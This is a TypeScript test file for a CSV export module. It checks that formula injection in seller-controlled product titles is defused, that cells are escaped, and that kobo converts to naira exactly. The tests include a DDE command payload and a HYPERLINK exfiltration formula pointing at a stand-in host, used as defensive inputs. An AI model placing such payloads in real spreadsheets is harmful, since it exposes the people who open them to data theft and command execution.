/**
 * CSV export.
 *
 * User journeys these tests encode:
 *
 *  1. As a seller, I download my transactions and open them in Excel, and the
 *     numbers are the numbers — not a formula someone put in a product title.
 *  2. As a seller, the money columns are naira I can hand to an accountant,
 *     derived from integer kobo so nothing was rounded on the way out.
 *
 * The injection tests are the point. A product title is seller-controlled text
 * that ends up in a spreadsheet a human opens, and Excel executes a cell that
 * starts with "=" without asking.
 */

import { describe, expect, it } from 'vitest';
import { escapeCsvCell, koboToNairaString, toCsv } from '../../src/lib/export/csv';

describe('formula injection is neutralised', () => {
  // Excel and Sheets treat these leading characters as the start of a formula.
  it.each(['=', '+', '-', '@'])('defuses a cell starting with "%s"', (prefix) => {
    const cell = escapeCsvCell(`${prefix}cmd|'/c calc'!A1`);
    expect(cell.startsWith(`${prefix}`)).toBe(false);
  });

  it('defuses the classic HYPERLINK exfiltration payload', () => {
    const payload = '=HYPERLINK("http://evil.test?d="&A1,"Click")';
    const cell = escapeCsvCell(payload);

    expect(cell).not.toMatch(/^"?=/);
    // The text is preserved so the seller still sees what was there.
    expect(cell).toContain('HYPERLINK');
  });

  it('defuses leading tab and carriage return, which also trigger parsing', () => {
    expect(escapeCsvCell('\t=1+1').startsWith('\t')).toBe(false);
    expect(escapeCsvCell('\r=1+1').startsWith('\r')).toBe(false);
  });

  it('leaves ordinary text alone', () => {
    expect(escapeCsvCell('Ankara Shirt')).toBe('Ankara Shirt');
  });

  it('only defuses a LEADING formula character, not one anywhere in the text', () => {
    // An email contains @ but does not start with it, so it is not a formula
    // and must not be mangled. Over-defusing would put a stray apostrophe in
    // front of every address in the file.
    expect(escapeCsvCell('buyer@example.com')).toBe('buyer@example.com');
    expect(escapeCsvCell('Shirt = Large')).toBe('Shirt = Large');
  });

  it('does not mangle a negative number written as text', () => {
    // A negative amount is legitimate in a refund row; it must stay readable.
    const cell = escapeCsvCell('-5000');
    expect(cell).toContain('5000');
  });
});

describe('standard CSV escaping', () => {
  it('quotes a field containing a comma', () => {
    expect(escapeCsvCell('Lagos, Nigeria')).toBe('"Lagos, Nigeria"');
  });

  it('doubles embedded quotes', () => {
    expect(escapeCsvCell('The "Big" Shirt')).toBe('"The ""Big"" Shirt"');
  });

  it('quotes a field containing a newline', () => {
    expect(escapeCsvCell('line one\nline two')).toBe('"line one\nline two"');
  });

  it('renders null and undefined as empty, not as the word', () => {
    expect(escapeCsvCell(null)).toBe('');
    expect(escapeCsvCell(undefined)).toBe('');
  });

  it('renders numbers without quoting', () => {
    expect(escapeCsvCell(1_000)).toBe('1000');
    expect(escapeCsvCell(0)).toBe('0');
  });
});

describe('money is exported as naira derived from kobo', () => {
  it('converts whole naira', () => {
    expect(koboToNairaString(250_000)).toBe('2500.00');
  });

  it('keeps the kobo places', () => {
    expect(koboToNairaString(250_075)).toBe('2500.75');
    expect(koboToNairaString(5)).toBe('0.05');
    expect(koboToNairaString(0)).toBe('0.00');
  });

  it('handles negatives, which refund rows carry', () => {
    expect(koboToNairaString(-250_075)).toBe('-2500.75');
  });

  it('never emits a float artefact', () => {
    // 0.1 + 0.2 territory: every value here is derived by integer division.
    for (const kobo of [1, 7, 33, 99, 100, 101, 999_999_999]) {
      expect(koboToNairaString(kobo)).toMatch(/^-?\d+\.\d{2}$/);
    }
  });

  it('refuses a fractional kobo rather than rounding silently', () => {
    expect(() => koboToNairaString(1999.5)).toThrow();
  });
});

describe('toCsv', () => {
  const columns = [
    { key: 'date' as const, header: 'Date' },
    { key: 'title' as const, header: 'Product' },
    { key: 'amount' as const, header: 'Amount (NGN)' },
  ];

  it('emits a header row then the data', () => {
    const csv = toCsv(columns, [{ date: '2026-09-21', title: 'Shirt', amount: '2500.00' }]);
    const lines = csv.trim().split('\r\n');

    expect(lines[0]).toBe('Date,Product,Amount (NGN)');
    expect(lines[1]).toBe('2026-09-21,Shirt,2500.00');
  });

  it('emits only a header for an empty result', () => {
    // An empty file with no header is indistinguishable from a broken export.
    const csv = toCsv(columns, []);
    expect(csv.trim()).toBe('Date,Product,Amount (NGN)');
  });

  it('escapes every cell, including ones from seller-controlled text', () => {
    const csv = toCsv(columns, [
      { date: '2026-09-21', title: '=1+1', amount: '2500.00' },
    ]);
    expect(csv).not.toContain(',=1+1,');
  });

  it('uses CRLF, which is what the CSV spec and Excel expect', () => {
    const csv = toCsv(columns, [{ date: 'a', title: 'b', amount: 'c' }]);
    expect(csv).toContain('\r\n');
  });
});
